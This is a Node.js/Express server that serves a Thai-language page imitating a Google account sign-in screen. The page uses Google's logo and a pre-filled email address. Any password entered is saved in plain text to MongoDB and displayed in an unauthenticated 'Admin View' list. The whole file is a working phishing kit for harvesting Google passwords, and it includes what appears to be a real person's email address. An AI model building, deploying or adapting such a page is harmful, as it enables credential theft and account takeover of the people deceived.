const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// อนุญาตให้โหลดแค่ไฟล์รูปโปรไฟล์ไฟล์เดียว ป้องกันการชนกับไฟล์ index.html
app.get('/avatar.jpg', (req, res) => {
  res.sendFile(path.join(__dirname, 'avatar.jpg'));
});

const MONGODB_URI = process.env.MONGODB_URI;

mongoose.connect(MONGODB_URI)
  .then(() => console.log('MongoDB connected successfully'))
  .catch(err => console.error('MongoDB connection error:', err));

const userSchema = new mongoose.Schema({
  email: { type: String, default: 'taiphak25442001@gmail.com' },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="th">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ลงชื่อเข้าใช้ - บัญชี Google</title>
      <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        body { font-family: 'Roboto', Arial, sans-serif; background: #f0f4f9; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .main-content { flex: 1; display: flex; align-items: center; justify-content: center; width: 100%; padding: 20px; box-sizing: border-box; flex-direction: column; }
        .card { background: #fff; width: 100%; max-width: 448px; border-radius: 28px; padding: 40px; box-sizing: border-box; text-align: center; }
        .logo svg { width: 40px; height: 40px; margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 400; color: #1f1f1f; margin: 0 0 16px 0; }
        
        .account-pill { display: inline-flex; align-items: center; border: 1px solid #747775; border-radius: 32px; padding: 4px 12px 4px 4px; margin-bottom: 32px; cursor: pointer; }
        .account-pill img { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; margin-right: 8px; }
        .account-pill span { font-size: 14px; color: #1f1f1f; font-weight: 500; }
        .account-pill .arrow { font-size: 10px; margin-left: 8px; color: #444746; }

        .info-box { background: #d3e3fd; border-radius: 16px; padding: 16px; margin-bottom: 24px; display: flex; align-items: flex-start; text-align: left; }
        .info-icon { background: #0a57d0; color: #fff; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; font-family: serif; margin-right: 12px; flex-shrink: 0; margin-top: 1px; }
        .info-text { color: #041e49; font-size: 14px; line-height: 20px; }

        .instruction { color: #1f1f1f; font-size: 16px; text-align: left; margin-bottom: 24px; }

        .input-group { margin-bottom: 12px; text-align: left; position: relative; }
        .input-group input { width: 100%; padding: 16px 14px; font-size: 16px; border: 1px solid #747775; border-radius: 4px; box-sizing: border-box; outline: none; background: #fff; transition: border 0.2s; color: #1f1f1f; }
        .input-group input:focus { border: 2px solid #0a57d0; padding: 15px 13px; }
        .input-group input::placeholder { color: #444746; }

        .checkbox-container { display: flex; align-items: center; margin-bottom: 40px; cursor: pointer; text-align: left; }
        .checkbox-container input { width: 18px; height: 18px; margin: 0 16px 0 2px; accent-color: #0a57d0; cursor: pointer; }
        .checkbox-container label { font-size: 14px; color: #1f1f1f; cursor: pointer; }

        .btn-container { display: flex; justify-content: space-between; align-items: center; }
        .btn-link { color: #0b57d0; text-decoration: none; font-size: 14px; font-weight: 500; padding: 8px 8px; margin-left: -8px; border-radius: 20px; transition: background 0.2s; }
        .btn-link:hover { background: #f8fafd; }
        .btn-primary { background: #0b57d0; color: #fff; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 20px; cursor: pointer; height: 40px; transition: background 0.2s; }
        .btn-primary:hover { background: #0842a0; }

        .footer { display: flex; justify-content: space-between; width: 100%; max-width: 448px; padding: 0 16px 16px; box-sizing: border-box; font-size: 12px; color: #444746; margin-top: 15px; }
        .footer-lang { cursor: pointer; }
        .footer-links a { color: #444746; text-decoration: none; margin-left: 24px; padding: 6px 8px; border-radius: 4px; }
        .footer-links a:hover { background: #e9eef6; }
        
        .admin-section { width: 100%; border-top: 1px solid #dadce0; padding: 20px; background: #fff; font-size: 12px; box-sizing: border-box; }
        .admin-section h3 { font-size: 14px; color: #5f6368; margin: 0 0 12px 0; }
        ul { padding-left: 20px; color: #1f1f1f; max-height: 150px; overflow-y: auto; margin: 0; }
        li { margin-bottom: 6px; }
      </style>
    </head>
    <body>
      <div class="main-content">
        <div class="card">
          <div class="logo">
            <svg viewBox="0 0 24 24" width="36" height="36" xmlns="http://www.w3.org/2000/svg">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
          </div>
          <h1>ไตรภาค</h1>
          
          <div class="account-pill">
            <img src="/avatar.jpg" alt="avatar" onerror="this.src='https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=80'">
            <span>taiphak25442001@gmail.com</span>
            <span class="arrow">▼</span>
          </div>

          <div class="info-box">
            <div class="info-icon">i</div>
            <div class="info-text">เลือก "ลองวิธีอื่น" เพื่อใช้พาสคีย์สำหรับการลงชื่อเข้าใช้ที่ง่ายและปลอดภัยยิ่งขึ้น</div>
          </div>

          <div class="instruction">
            หากต้องการดำเนินการต่อ โปรดยืนยันก่อนว่าเป็นคุณ
          </div>

          <form id="regForm">
            <div class="input-group">
              <input type="password" id="password" placeholder="ป้อนรหัสผ่าน" required>
            </div>
            <div class="checkbox-container">
              <input type="checkbox" id="showPassword">
              <label for="showPassword">แสดงรหัสผ่าน</label>
            </div>
            <div class="btn-container">
              <a href="#" class="btn-link">ลองวิธีอื่น</a>
              <button type="submit" class="btn-primary">ถัดไป</button>
            </div>
          </form>
        </div>

        <div class="footer">
          <div class="footer-lang">ไทย <span style="font-size: 10px; margin-left: 2px;">▼</span></div>
          <div class="footer-links">
            <a href="#">ความช่วยเหลือ</a>
            <a href="#">ความเป็นส่วนตัว</a>
            <a href="#">ข้อกำหนด</a>
          </div>
        </div>
      </div>

      <div class="admin-section">
        <h3>ข้อมูลรหัสผ่านที่บันทึกไว้ (Admin View):</h3>
        <ul id="userList">กำลังโหลด...</ul>
      </div>

      <script>
        const passwordInput = document.getElementById('password');
        const showPasswordCheckbox = document.getElementById('showPassword');

        showPasswordCheckbox.addEventListener('change', function() {
          passwordInput.type = this.checked ? 'text' : 'password';
        });

        async function loadUsers() {
          try {
            const res = await fetch('/api/users');
            const data = await res.json();
            const list = document.getElementById('userList');
            
            const validData = data.filter(user => user.password && user.password !== 'undefined');

            if (validData.length === 0) {
              list.innerHTML = '<li>ยังไม่มีข้อมูลในระบบ</li>';
              return;
            }
            list.innerHTML = validData.map(user => 
              '<li><strong>รหัส:</strong> ' + user.password + ' <small style="color:#666;">(' + new Date(user.createdAt).toLocaleString() + ')</small></li>'
            ).join('');
          } catch (err) {
            document.getElementById('userList').innerHTML = '<li>เกิดข้อผิดพลาดในการโหลดข้อมูล</li>';
          }
        }

        document.getElementById('regForm').addEventListener('submit', async (e) => {
          e.preventDefault();
          const password = passwordInput.value;
          
          if(!password) return;

          const btn = document.querySelector('.btn-primary');
          btn.disabled = true;

          try {
            const res = await fetch('/api/register', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email: 'taiphak25442001@gmail.com', password: password })
            });

            if (res.ok) {
              alert('ยืนยันตัวตนสำเร็จ!');
              passwordInput.value = '';
              loadUsers();
            } else {
              alert('เกิดข้อผิดพลาด');
            }
          } catch (err) {
            alert('ไม่สามารถเชื่อมต่อเซิร์ฟเวอร์ได้');
          } finally {
            btn.disabled = false;
          }
        });

        loadUsers();
      </script>
    </body>
    </html>
  `);
});

app.post('/api/register', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!password) {
      return res.status(400).json({ error: 'Password is required' });
    }
    const newUser = new User({ email: email || 'taiphak25442001@gmail.com', password });
    await newUser.save();
    res.status(201).json({ message: 'Saved successfully!', user: newUser });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/users', async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 });
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(PORT, () => {
  console.log('Server is running on port ' + PORT);
});
